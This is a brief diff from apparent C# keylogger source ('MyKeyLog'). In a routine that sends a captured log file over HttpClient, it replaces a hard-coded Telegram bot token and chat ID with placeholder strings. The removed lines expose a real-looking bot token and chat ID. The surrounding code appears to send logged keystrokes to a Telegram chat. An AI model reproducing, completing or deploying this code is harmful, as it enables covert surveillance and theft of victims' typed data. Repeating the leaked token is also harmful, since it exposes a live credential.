@@ -280,8 +280,8 @@ namespace MyKeyLog
             {
                 MessageBox.Show($"Error sending log file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
-            string botToken = "7586281340:AAFYclFjzPxcue9r4WKuINFVqcPvZ95dcZo";
-            string chatId = "770704283";
+            string botToken = "yourTOKEN";
+            string chatId = "YourchatId";
             string logFilePath = _logFilePath;
 
             using (var httpClient = new HttpClient())
